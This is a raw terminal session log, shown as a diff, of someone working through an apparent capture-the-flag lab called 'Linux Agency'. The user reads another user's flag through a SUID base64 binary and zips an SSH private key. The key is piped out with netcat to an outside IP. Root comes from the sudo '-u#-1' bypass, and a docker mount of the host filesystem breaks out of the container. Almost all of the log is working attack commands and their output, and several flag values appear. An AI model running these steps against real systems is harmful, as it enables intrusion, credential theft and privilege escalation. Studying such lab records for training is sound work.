@@ -1,0 +1,278 @@
+Script started on 2025-11-09 12:12:24+03:00 [COMMAND="ssh penelope@linux.agency.thm" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="26"]
+penelope@linux.agency.thm's password: 
+Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+0 packages can be updated.
+0 updates are security updates.
+
+]0;penelope@linuxagency: ~[01;32mpenelope@linuxagency[00m:[01;34m~[00m$ ls -al
+total 84
+drwxr-x---  4 penelope penelope  4096 Nov  9 01:11 [0m[01;34m.[0m
+drwxr-xr-x 45 root     root      4096 Jan 12  2021 [01;34m..[0m
+-rwsr-sr-x  1 maya     maya     39096 Jan 12  2021 [37;41mbase64[0m
+lrwxrwxrwx  1 penelope penelope     9 Jan 12  2021 [01;36m.bash_history[0m -> [40;33;01m/dev/null[0m
+-rw-r--r--  1 penelope penelope   220 Jan 12  2021 .bash_logout
+-rw-r--r--  1 penelope penelope  3771 Jan 12  2021 .bashrc
+drwx------  2 penelope penelope  4096 Nov  9 01:11 [01;34m.cache[0m
+-rw-r--r--  1 penelope penelope  8980 Jan 12  2021 examples.desktop
+-r--------  1 penelope penelope    43 Jan 12  2021 flag.txt
+drwx------  3 penelope penelope  4096 Jan 12  2021 [01;34m.gnupg[0m
+-rw-r--r--  1 penelope penelope   807 Jan 12  2021 .profile
+]0;penelope@linuxagency: ~[01;32mpenelope@linuxagency[00m:[01;34m~[00m$ cat flag.txt 
+penelope{2da1c2e9d2bd0004556ae9e107c1d222}
+]0;penelope@linuxagency: ~[01;32mpenelope@linuxagency[00m:[01;34m~[00m$ ls -l[Kal /home/maya
+ls: cannot open directory '/home/maya': Permission denied
+]0;penelope@linuxagency: ~[01;32mpenelope@linuxagency[00m:[01;34m~[00m$ LFILE=/home/maya/flag.txt
+]0;penelope@linuxagency: ~[01;32mpenelope@linuxagency[00m:[01;34m~[00m$ sudo base64 "$LFILE" | base64 --decode
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+Password: 
+sudo: a password is required
+
+]0;penelope@linuxagency: ~[01;32mpenelope@linuxagency[00m:[01;34m~[00m$ sudo base64 "$LFILE" | base64 --decode[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1@ [1@-[1@u[C[1@ [1@m[1@a[1@y[1@a
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+Password: 
+sudo: a password is required
+
+]0;penelope@linuxagency: ~[01;32mpenelope@linuxagency[00m:[01;34m~[00m$ ,.ba[K[K[K[K./base64 ""$"L"F"I"L"E"[C | BASE64 -D
+BASE64: command not found
+]0;penelope@linuxagency: ~[01;32mpenelope@linuxagency[00m:[01;34m~[00m$ ./base64 "$LFILE" | BASE64 -D[K[K[K[K[K[K[K[K[Kbase64 -d
+maya{a66e159374b98f64f89f7c8d458ebb2b}
+]0;penelope@linuxagency: ~[01;32mpenelope@linuxagency[00m:[01;34m~[00m$ su maya
+Password: 
+]0;maya@linuxagency: /home/penelope[01;32mmaya@linuxagency[00m:[01;34m/home/penelope[00m$ cd
+]0;maya@linuxagency: ~[01;32mmaya@linuxagency[00m:[01;34m~[00m$ ls -al
+total 52
+drwxr-x---  5 maya maya 4096 Jan 15  2021 [0m[01;34m.[0m
+drwxr-xr-x 45 root root 4096 Jan 12  2021 [01;34m..[0m
+lrwxrwxrwx  1 maya maya    9 Jan 12  2021 [01;36m.bash_history[0m -> [40;33;01m/dev/null[0m
+-rw-r--r--  1 maya maya  220 Jan 12  2021 .bash_logout
+-rw-r--r--  1 maya maya 3771 Jan 12  2021 .bashrc
+-rw-r--r--  1 maya maya  519 Jan 12  2021 elusive_targets.txt
+-rw-r--r--  1 maya maya 8980 Jan 12  2021 examples.desktop
+-r--------  1 maya maya   39 Jan 12  2021 flag.txt
+drwxr-xr-x  3 maya maya 4096 Jan 12  2021 [01;34m.local[0m
+drwxr-xr-x  2 maya maya 4096 Jan 15  2021 [01;34mold_robert_ssh[0m
+-rw-r--r--  1 maya maya  807 Jan 12  2021 .profile
+drwx------  2 maya maya 4096 Jan 12  2021 [01;34m.ssh[0m
+]0;maya@linuxagency: ~[01;32mmaya@linuxagency[00m:[01;34m~[00m$ zip -r robert.zip old_robert_ssh/
+  adding: old_robert_ssh/ (stored 0%)
+  adding: old_robert_ssh/id_rsa.pub (deflated 16%)
+  adding: old_robert_ssh/id_rsa (deflated 23%)
+]0;maya@linuxagency: ~[01;32mmaya@linuxagency[00m:[01;34m~[00m$ dd if [K=robert.zip status=[r[K[Kprogress | nc 10.9.0.213 4444
+4+1 records in
+4+1 records out
+2224 bytes (2.2 kB, 2.2 KiB) copied, 6.503e-05 s, 34.2 MB/s
+]0;maya@linuxagency: ~[01;32mmaya@linuxagency[00m:[01;34m~[00m$ ss -tulnp
+Netid    State      Recv-Q     Send-Q               Local Address:Port            Peer Address:Port     
+udp      UNCONN     36864      0                    127.0.0.53%lo:53                   0.0.0.0:*        
+udp      UNCONN     0          0                10.10.77.222%ens5:68                   0.0.0.0:*        
+udp      UNCONN     0          0                          0.0.0.0:631                  0.0.0.0:*        
+udp      UNCONN     0          0                          0.0.0.0:59311                0.0.0.0:*        
+udp      UNCONN     7680       0                          0.0.0.0:5353                 0.0.0.0:*        
+udp      UNCONN     0          0                             [::]:58023                   [::]:*        
+udp      UNCONN     46336      0                             [::]:5353                    [::]:*        
+tcp      LISTEN     0          128                      127.0.0.1:36425                0.0.0.0:*        
+tcp      LISTEN     0          128                      127.0.0.1:2222                 0.0.0.0:*        
+tcp      LISTEN     0          128                      127.0.0.1:80                   0.0.0.0:*        
+tcp      LISTEN     0          128                  127.0.0.53%lo:53                   0.0.0.0:*        
+tcp      LISTEN     0          128                        0.0.0.0:22                   0.0.0.0:*        
+tcp      LISTEN     0          5                        127.0.0.1:631                  0.0.0.0:*        
+tcp      LISTEN     0          128                           [::]:22                      [::]:*        
+tcp      LISTEN     0          5                            [::1]:631                     [::]:*        
+]0;maya@linuxagency: ~[01;32mmaya@linuxagency[00m:[01;34m~[00m$ ls -al
+total 56
+drwxr-x---  5 maya maya 4096 Nov  9 01:17 [0m[01;34m.[0m
+drwxr-xr-x 45 root root 4096 Jan 12  2021 [01;34m..[0m
+lrwxrwxrwx  1 maya maya    9 Jan 12  2021 [01;36m.bash_history[0m -> [40;33;01m/dev/null[0m
+-rw-r--r--  1 maya maya  220 Jan 12  2021 .bash_logout
+-rw-r--r--  1 maya maya 3771 Jan 12  2021 .bashrc
+-rw-r--r--  1 maya maya  519 Jan 12  2021 elusive_targets.txt
+-rw-r--r--  1 maya maya 8980 Jan 12  2021 examples.desktop
+-r--------  1 maya maya   39 Jan 12  2021 flag.txt
+drwxr-xr-x  3 maya maya 4096 Jan 12  2021 [01;34m.local[0m
+drwxr-xr-x  2 maya maya 4096 Jan 15  2021 [01;34mold_robert_ssh[0m
+-rw-r--r--  1 maya maya  807 Jan 12  2021 .profile
+-rw-rw-r--  1 maya maya 2224 Nov  9 01:17 [01;31mrobert.zip[0m
+drwx------  2 maya maya 4096 Jan 12  2021 [01;34m.ssh[0m
+]0;maya@linuxagency: ~[01;32mmaya@linuxagency[00m:[01;34m~[00m$ cd old_robert_ssh/
+]0;maya@linuxagency: ~/old_robert_ssh[01;32mmaya@linuxagency[00m:[01;34m~/old_robert_ssh[00m$ ls -al
+total 16
+drwxr-xr-x 2 maya maya 4096 Jan 15  2021 [0m[01;34m.[0m
+drwxr-x--- 5 maya maya 4096 Nov  9 01:17 [01;34m..[0m
+-rw------- 1 maya maya 1766 Jan 12  2021 id_rsa
+-rw-r--r-- 1 maya maya  401 Jan 15  2021 id_rsa.pub
+]0;maya@linuxagency: ~/old_robert_ssh[01;32mmaya@linuxagency[00m:[01;34m~/old_robert_ssh[00m$ ssh -i id_rsa robert@127.0.0.1 -p 2222
+robert@127.0.0.1's password: 
+Last login: Tue Jan 12 17:02:07 2021 from 172.17.0.1
+]0;robert@ec96850005d6: ~[01;32mrobert@ec96850005d6[00m:[01;34m~[00m$ cd
+]0;robert@ec96850005d6: ~[01;32mrobert@ec96850005d6[00m:[01;34m~[00m$ ls -al
+total 24
+drwxr-xr-x 2 robert robert 4096 Jan 12  2021 [0m[01;34m.[0m
+drwxr-xr-x 1 root   root   4096 Jan 12  2021 [01;34m..[0m
+lrwxrwxrwx 1 robert robert    9 Jan 12  2021 [01;36m.bash_history[0m -> [40;33;01m/dev/null[0m
+-rw-r--r-- 1 robert robert  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 robert robert 3771 Apr  4  2018 .bashrc
+-rw-r--r-- 1 robert robert  807 Apr  4  2018 .profile
+-rw-r--r-- 1 robert robert   78 Jan 12  2021 robert.txt
+]0;robert@ec96850005d6: ~[01;32mrobert@ec96850005d6[00m:[01;34m~[00m$ cat robert.txt 
+You shall not pass from here!!!
+
+I will not allow ICA to take over my world.
+
+]0;robert@ec96850005d6: ~[01;32mrobert@ec96850005d6[00m:[01;34m~[00m$ sudo --version
+Sudo version 1.8.21p2
+Sudoers policy plugin version 1.8.21p2
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.21p2
+]0;robert@ec96850005d6: ~[01;32mrobert@ec96850005d6[00m:[01;34m~[00m$ sudo -u [K#-1 /bin.bash[K[K[K[K[K/bash
+]0;root@ec96850005d6: ~[01;32mroot@ec96850005d6[00m:[01;34m~[00m# whoami
+root
+]0;root@ec96850005d6: ~[01;32mroot@ec96850005d6[00m:[01;34m~[00m# cd
+]0;root@ec96850005d6: ~[01;32mroot@ec96850005d6[00m:[01;34m~[00m# ls -al
+total 24
+drwxr-xr-x 2 robert robert 4096 Jan 12  2021 [0m[01;34m.[0m
+drwxr-xr-x 1 root   root   4096 Jan 12  2021 [01;34m..[0m
+lrwxrwxrwx 1 robert robert    9 Jan 12  2021 [01;36m.bash_history[0m -> [40;33;01m/dev/null[0m
+-rw-r--r-- 1 robert robert  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 robert robert 3771 Apr  4  2018 .bashrc
+-rw-r--r-- 1 robert robert  807 Apr  4  2018 .profile
+-rw-r--r-- 1 robert robert   78 Jan 12  2021 robert.txt
+]0;root@ec96850005d6: ~[01;32mroot@ec96850005d6[00m:[01;34m~[00m# cat robert.txt 
+You shall not pass from here!!!
+
+I will not allow ICA to take over my world.
+
+]0;root@ec96850005d6: ~[01;32mroot@ec96850005d6[00m:[01;34m~[00m# cd r[K/root
+]0;root@ec96850005d6: /root[01;32mroot@ec96850005d6[00m:[01;34m/root[00m# ls -al
+total 40
+drwx------ 1 root root 4096 Jan 12  2021 [0m[01;34m.[0m
+drwxr-xr-x 1 root root 4096 Jan 12  2021 [01;34m..[0m
+-rw------- 1 root root  852 Jan 12  2021 .bash_history
+-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc
+drwxr-xr-x 3 root root 4096 Jan 12  2021 [01;34m.local[0m
+-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
+drwxr-xr-x 2 root root 4096 Jan 12  2021 [01;34m.ssh[0m
+-rw------- 1 root root 3148 Jan 12  2021 .viminfo
+-rw-r--r-- 1 root root  204 Jan 12  2021 success.txt
+-r-------- 1 root root   39 Jan 12  2021 user.txt
+]0;root@ec96850005d6: /root[01;32mroot@ec96850005d6[00m:[01;34m/root[00m# cat user.txt 
+user{620fb94d32470e1e9dcf8926481efc96}
+]0;root@ec96850005d6: /root[01;32mroot@ec96850005d6[00m:[01;34m/root[00m# cd .ssh
+]0;root@ec96850005d6: /root/.ssh[01;32mroot@ec96850005d6[00m:[01;34m/root/.ssh[00m# ls -al
+total 8
+drwxr-xr-x 2 root root 4096 Jan 12  2021 [0m[01;34m.[0m
+drwx------ 1 root root 4096 Jan 12  2021 [01;34m..[0m
+]0;root@ec96850005d6: /root/.ssh[01;32mroot@ec96850005d6[00m:[01;34m/root/.ssh[00m# cd ..
+]0;root@ec96850005d6: /root[01;32mroot@ec96850005d6[00m:[01;34m/root[00m# cat success.txt 
+47 you made it!!!
+
+You have made it, Robert has been taught a lesson not to mess with ICA.
+Now, Return to our Agency back with some safe route.
+All the previous door's have been closed.
+
+Good Luck Amigo!
+]0;root@ec96850005d6: /root[01;32mroot@ec96850005d6[00m:[01;34m/root[00m# cd /tmp
+]0;root@ec96850005d6: /tmp[01;32mroot@ec96850005d6[00m:[01;34m/tmp[00m# /docker run -v /:/mnt — rm -it mangoman chroot /mnt sh
+bash: /docker: No such file or directory
+]0;root@ec96850005d6: /tmp[01;32mroot@ec96850005d6[00m:[01;34m/tmp[00m# /docker run -v /:/mnt — rm -it mangoman chroot /mnt sh[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1@.
+./docker: invalid reference format.
+See './docker run --help'.
+]0;root@ec96850005d6: /tmp[01;32mroot@ec96850005d6[00m:[01;34m/tmp[00m# ls -al
+total 87132
+drwxrwxrwt 1 root root       4096 Jan 12  2021 [0m[30;42m.[0m
+drwxr-xr-x 1 root root       4096 Jan 12  2021 [01;34m..[0m
+-rwxr-xr-x 1 root robert 89213800 Jan 12  2021 [01;32mdocker[0m
+]0;root@ec96850005d6: /tmp[01;32mroot@ec96850005d6[00m:[01;34m/tmp[00m# ./docker run -v /:/host -it --rm alpine chroot /host sh
+Unable to find image 'alpine:latest' locally
+
+whoami
+./docker: Error response from daemon: Get https://registry-1.docker.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers).
+See './docker run --help'.
+]0;root@ec96850005d6: /tmp[01;32mroot@ec96850005d6[00m:[01;34m/tmp[00m# 
+]0;root@ec96850005d6: /tmp[01;32mroot@ec96850005d6[00m:[01;34m/tmp[00m# whoami
+root
+]0;root@ec96850005d6: /tmp[01;32mroot@ec96850005d6[00m:[01;34m/tmp[00m# whoami
+root
+]0;root@ec96850005d6: /tmp[01;32mroot@ec96850005d6[00m:[01;34m/tmp[00m# ./docker ps -a
+CONTAINER ID        IMAGE               COMMAND               CREATED             STATUS              PORTS                    NAMES
+ec96850005d6        mangoman            "/usr/sbin/sshd -D"   4 years ago         Up 2 hours          127.0.0.1:2222->22/tcp   kronstadt_industries
+]0;root@ec96850005d6: /tmp[01;32mroot@ec96850005d6[00m:[01;34m/tmp[00m# ./docker run -v /:/mnt — rm -it mangoman chroot /mnt sh
+./docker: invalid reference format.
+See './docker run --help'.
+]0;root@ec96850005d6: /tmp[01;32mroot@ec96850005d6[00m:[01;34m/tmp[00m# ./docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+Unable to find image 'alpine:latest' locally
+./docker: Error response from daemon: Get https://registry-1.docker.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers).
+See './docker run --help'.
+]0;root@ec96850005d6: /tmp[01;32mroot@ec96850005d6[00m:[01;34m/tmp[00m# ./docker run -v /:/mnt --rm -it mangoman chroot /mnt sh
+# whoami
+root
+# cd /root
+# ls -al
+total 48
+drwx------  5 root root  4096 Feb  1  2021 .
+drwxr-xr-x 24 root root  4096 Jan 12  2021 ..
+lrwxrwxrwx  1 root root     9 Jan 12  2021 .bash_history -> /dev/null
+-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
+drwx------  2 root root  4096 Jan 12  2021 .cache
+drwx------  3 root root  4096 Jan 12  2021 .gnupg
+drwxr-xr-x  3 root root  4096 Jan 12  2021 .local
+-rw-r--r--  1 root root   148 Aug 17  2015 .profile
+-rw-------  1 root root     0 Feb  1  2021 .python_history
+-rw-------  1 root root 10868 Jan 15  2021 .viminfo
+-r--------  1 root root   271 Jan 12  2021 message.txt
+-r--------  1 root root    39 Jan 12  2021 root.txt
+# cat mes	sage.txt
+Nice Job 47
+We are really impressed with your skills
+
+Hope you enjoyed your journey!!
+
+Your director's of ICA 
+   0z09e & Xyan1d3
+
+
+========>0z09e
+https://github.com/0z09e
+https://twitter.com/0z09e
+
+========>Xyan1d3
+https://twitter.com/xyan1d3
+https://github.com/xyan1d3
+# cat root.txt
+root{62ca2110ce7df377872dd9f0797f8476}
+# exit
+]0;root@ec96850005d6: /tmp[01;32mroot@ec96850005d6[00m:[01;34m/tmp[00m# exit
+exit
+]0;robert@ec96850005d6: ~[01;32mrobert@ec96850005d6[00m:[01;34m~[00m$ exit
+logout
+Connection to 127.0.0.1 closed.
+]0;maya@linuxagency: ~/old_robert_ssh[01;32mmaya@linuxagency[00m:[01;34m~/old_robert_ssh[00m$ exit
+exit
+]0;penelope@linuxagency: ~[01;32mpenelope@linuxagency[00m:[01;34m~[00m$ exit
+logout
+Connection to linux.agency.thm closed.
+
+Script done on 2025-11-09 12:32:23+03:00 [COMMAND_EXIT_CODE="0"]
